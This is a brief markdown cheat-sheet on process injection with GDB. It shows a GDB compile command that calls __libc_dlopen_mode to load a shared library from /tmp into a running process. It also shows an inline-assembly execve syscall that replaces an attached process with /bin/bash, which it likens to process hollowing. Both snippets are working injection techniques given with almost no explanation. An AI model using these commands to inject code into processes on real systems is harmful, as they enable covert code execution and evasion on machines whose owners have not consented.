# Injection With GDB

## Inject Shared Library

It is possible to load a shared library into a process using GDB.

```bash
compile __libc_dlopen_mode("/tmp/libx.so", 2)
```

## Inject Binary

Something like a process hollowing, it can be done openning GDB against a process just like done for injecting a shared library. Type the following code, chenging the path:

```
register char *x asm("%rdi") = "/bin/bash";asm("xor %rsi,%rsi; xor %rdx,%rdx; mov $59,%rax; syscall;");
```
